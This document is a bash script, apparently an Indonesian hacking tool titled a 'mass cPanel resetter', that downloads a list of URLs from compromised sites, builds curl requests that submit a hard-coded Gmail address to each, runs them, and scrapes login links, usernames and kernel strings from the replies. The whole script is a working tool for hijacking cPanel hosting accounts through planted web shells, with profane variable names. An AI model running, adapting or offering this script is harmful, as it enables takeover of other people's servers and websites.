#!/bin/bash
#sin
email="kannakannakannax@gmail.com" #yours
## enable this gmail setup, neither disable nor won't send as logs.
## (https://www.lifewire.com/how-to-enable-gmail-via-imap-1170856) // imap
## (https://www.google.com/settings/u/1/security/lesssecureapps) // Less Secure
## (https://accounts.google.com/b/0/displayunlockcaptcha) // Captcha

## echo "email: " , then read [-r] email (if wanna put mail from console instead)
begin=$(date +"%s")

RED=$(tput setaf 1) 
GREEN=$(tput setaf 2) 
CYAN=$(tput setaf 6) 
WHITE=$(tput setaf 7) 

pasti="?email=${email}\&submit=+>+'" #parameter

#trash pattern will show here

kontol=" | grep -oP '(?<=href=" #login
bajingan='")[^"]*' #pecahan
itel="'" #tutupan
mot='|(?<=value=")[^"]*|' #user
gadol="(?<=<h4>)[^<]*" #kernel


## retard pattern
## pars='| sed "s/$/'
## parsx=" | grep -oP '(?<=href="
## parsxx='")[^"]*|(?<=value=")[^"]*'
## parsxxx="' | sed 's/Crack/User:/'"
## goblok='sed "s/$/hey/"'
## $($pars$parsx$parsxx$parsxxx$goblok)

echo -e ${CYAN}' 
      _     _                                _     
     | |   (_)                              | |    
  ___| |__  _  ____ _   _  ____ _____    ___| |__  
 /___)  _ \| |/ _  | | | |/ ___) ___ |  /___)  _ \ 
|___ | | | | ( (_| | |_| | |   | ____|_|___ | | | |
(___/|_| |_|_|\___ |____/|_|   |_____|_|___/|_| |_|
             (_____|                               
                        kang maling,
                            [mass cPanel resetter with bash]\n'
echo "raw list:"
read -r raw
#do here
wget -q -nv -O bajing.txt ${raw};
echo "Mail: "${RED}$email${GREEN}
printf "\n"
cat bajing.txt | sed "s/htt/curl -s 'htt/" | sed "s/$/$pasti/" | sed "s/$/$kontol$bajingan/" | sed "s/$/$mot/" | sed "s/$/$gadol$itel/" > aasu
./aasu | sed 's/ > /user:/' | sed 's/=1/=1\n/'


#length
termin=$(date +"%s")
difftimelps=$(($termin-$begin))
echo "${WHITE}$(($difftimelps / 60)) minutes and $(($difftimelps % 60)) sec. elapsed ${RED}shigure"